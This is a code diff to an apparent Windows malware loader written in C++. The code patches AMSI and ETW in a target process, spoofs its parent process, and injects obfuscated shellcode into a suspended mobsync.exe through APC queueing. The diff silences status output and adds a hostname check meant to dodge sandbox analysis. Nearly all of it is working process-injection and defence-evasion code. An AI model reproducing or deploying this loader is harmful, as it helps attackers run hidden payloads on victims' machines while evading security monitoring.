@@ -80,7 +80,7 @@ void patchAMSI(OUT HANDLE& hProc) {
     NtProtectVirtualMemory(hProc, (PVOID*)&amsiAddr_bk, (PSIZE_T)&memPage, 0x04, &lpflOldProtect);
     NtWriteVirtualMemory(hProc, (LPVOID)amsiAddr, (PVOID)amsiPatch, sizeof(amsiPatch), (SIZE_T*)nullptr);
     NtProtectVirtualMemory(hProc, (PVOID*)&amsiAddr_bk, (PSIZE_T)&memPage, lpflOldProtect, &lpflOldProtect);
-    std::cout << "[+] Patched amsi!\n";
+    //std::cout << "[+] Patched amsi!\n";
 }
 
 //code stolen from https://github.com/Hagrid29/RemotePatcher/blob/main/RemotePatcher/RemotePatcher.cpp
@@ -100,7 +100,7 @@ void patchAMSIOpenSession(OUT HANDLE& hProc) {
     NtProtectVirtualMemory(hProc, (PVOID*)&amsiAddr_bk, (PSIZE_T)&memPage, 0x04, &lpflOldProtect);
     NtWriteVirtualMemory(hProc, (LPVOID)amsiAddr, (PVOID)amsiPatch, sizeof(amsiPatch), (SIZE_T*)nullptr);
     NtProtectVirtualMemory(hProc, (PVOID*)&amsiAddr_bk, (PSIZE_T)&memPage, lpflOldProtect, &lpflOldProtect);
-    std::cout << "[+] Patched amsi open session!\n";
+    //std::cout << "[+] Patched amsi open session!\n";
 }
 
 //code stolen from https://github.com/Hagrid29/RemotePatcher/blob/main/RemotePatcher/RemotePatcher.cpp
@@ -117,7 +117,7 @@ void patchETW(OUT HANDLE& hProc) {
     NtProtectVirtualMemory(hProc, (PVOID*)&etwAddr_bk, (PSIZE_T)&memPage, 0x04, &lpflOldProtect);
     NtWriteVirtualMemory(hProc, (LPVOID)etwAddr, (PVOID)etwPatch, sizeof(etwPatch), (SIZE_T*)nullptr);
     NtProtectVirtualMemory(hProc, (PVOID*)&etwAddr_bk, (PSIZE_T)&memPage, lpflOldProtect, &lpflOldProtect);
-    std::cout << "[+] Patched etw!\n";
+    //std::cout << "[+] Patched etw!\n";
 
 }
 
@@ -143,59 +143,59 @@ void howlow_sc(std::vector<byte> recovered)
     si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);
 
     // Disallow non-microsoft signed DLL's from hooking/injecting into our CreateProcess():
-    InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, &size);
-    DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
-    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(policy), NULL, NULL);
+InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, &size);
+DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
+UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(policy), NULL, NULL);
 
-    // Mask the PPID to that of explorer.exe
-    HANDLE explorer_handle = OpenProcess(PROCESS_ALL_ACCESS, false, get_PPID());
-    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &explorer_handle, sizeof(HANDLE), NULL, NULL);
+// Mask the PPID to that of explorer.exe
+HANDLE explorer_handle = OpenProcess(PROCESS_ALL_ACCESS, false, get_PPID());
+UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &explorer_handle, sizeof(HANDLE), NULL, NULL);
 
-    LPCWSTR hollow_bin = L"C:\\Windows\\System32\\mobsync.exe";
+LPCWSTR hollow_bin = L"C:\\Windows\\System32\\mobsync.exe";
 
-    if (!CreateProcess(
-        hollow_bin,			// LPCWSTR Command (Binary to Execute)
-        NULL,				// Command line
-        NULL,				// Process handle not inheritable
-        NULL,				// Thread handle not inheritable
-        FALSE,				// Set handle inheritance to FALSE
-        EXTENDED_STARTUPINFO_PRESENT
-        | CREATE_NO_WINDOW
-        | CREATE_SUSPENDED,	// Creation Flags
-        NULL,				// Use parent's environment block
-        NULL,				// Use parent's starting directory 
-        (LPSTARTUPINFOW)&si,// Pointer to STARTUPINFO structure
-        &pi					// Pointer to PROCESS_INFORMATION structure (removed extra parentheses)
-    )) {
-        DWORD errval = GetLastError();
-        std::cout << "whoops " << errval << std::endl;
-    }
+if (!CreateProcess(
+    hollow_bin,			// LPCWSTR Command (Binary to Execute)
+    NULL,				// Command line
+    NULL,				// Process handle not inheritable
+    NULL,				// Thread handle not inheritable
+    FALSE,				// Set handle inheritance to FALSE
+    EXTENDED_STARTUPINFO_PRESENT
+    | CREATE_NO_WINDOW
+    | CREATE_SUSPENDED,	// Creation Flags
+    NULL,				// Use parent's environment block
+    NULL,				// Use parent's starting directory 
+    (LPSTARTUPINFOW)&si,// Pointer to STARTUPINFO structure
+    &pi					// Pointer to PROCESS_INFORMATION structure (removed extra parentheses)
+)) {
+    DWORD errval = GetLastError();
+    std::cout << "whoops " << errval << std::endl;
+}
 
-    WaitForSingleObject(pi.hProcess, 1400);
-    hProcess = pi.hProcess;
-    hThread = pi.hThread;
+WaitForSingleObject(pi.hProcess, 1400);
+hProcess = pi.hProcess;
+hThread = pi.hThread;
 
-    mem = nullptr;
-    SIZE_T p_size = recovered.size();
+mem = nullptr;
+SIZE_T p_size = recovered.size();
 
-    //patch AMSI and ETW before anything else
-    patchAMSI(hProcess);
-    patchAMSIOpenSession(hProcess);
-    patchETW(hProcess);
+//patch AMSI and ETW before anything else
+patchAMSI(hProcess);
+patchAMSIOpenSession(hProcess);
+patchETW(hProcess);
 
-    NtAllocateVirtualMemory(hProcess, &mem, 0, (PSIZE_T)&p_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    std::cout << "Written to " << mem << std::endl;
-    NtWriteVirtualMemory(hProcess, mem, recovered.data(), recovered.size(), 0);
-    // will be implemented soon
-    // VirtualProtect(mem, (size_t)p_size, 0x20, MEM_COMMIT | MEM_RESERVE);
-    //NTSTATUS NTPVM = NtProtectVirtualMemory(hProcess, &mem , (PSIZE_T)&p_size, 0x20, dwOld, &dwOld);
-    NtQueueApcThread(hThread, (PKNORMAL_ROUTINE)mem, mem, NULL, NULL);
-    NtResumeThread(hThread, NULL);
+NtAllocateVirtualMemory(hProcess, &mem, 0, (PSIZE_T)&p_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+//std::cout << "Written to " << mem << std::endl;
+NtWriteVirtualMemory(hProcess, mem, recovered.data(), recovered.size(), 0);
+// will be implemented soon
+// VirtualProtect(mem, (size_t)p_size, 0x20, MEM_COMMIT | MEM_RESERVE);
+//NtProtectVirtualMemory(hProcess, mem , (PSIZE_T)&p_size, PAGE_EXECUTE_READ, dwOld);
+NtQueueApcThread(hThread, (PKNORMAL_ROUTINE)mem, mem, NULL, NULL);
+NtResumeThread(hThread, NULL);
 
-    // Overwrite shellcode with null bytes
-    Sleep(9999);
-    uint8_t overwrite[500];
-    NtWriteVirtualMemory(hProcess, mem, overwrite, sizeof(overwrite), 0);
+// Overwrite shellcode with null bytes
+Sleep(9999);
+uint8_t overwrite[500];
+NtWriteVirtualMemory(hProcess, mem, overwrite, sizeof(overwrite), 0);
 }
 
 std::string XOR(std::string decoded, std::string xorKey)
@@ -240,6 +240,25 @@ int main()
     xorKey = translate_morse(morsedxorKey);
 
     decoded = b64.base64_decode(sh3llc0de);
+
+    // sandbox check
+    string strHostname;
+    char name[MAX_COMPUTERNAME_LENGTH + 1];
+    DWORD size = sizeof(name);
+    GetComputerNameA(name, &size);
+
+    for (char character : name) strHostname.push_back(character);
+    if (strHostname.find("LEL") != std::string::npos) {
+        std::cout << "hit" << std::endl;
+        xorKey.replace(0, 1, "~");
+    }
+    
+    /*
+    if (strcmp(name, "DESKTOP-H39OG3S") == 0) {
+        std::cout << "Sandbox hit" << std::endl;
+        xorKey.replace(0, 1, "P");
+    }
+    */
 
     //xor is already in its own function
     //char x0rek3y[] = "Sup3rS3cur3K3yfTw!";
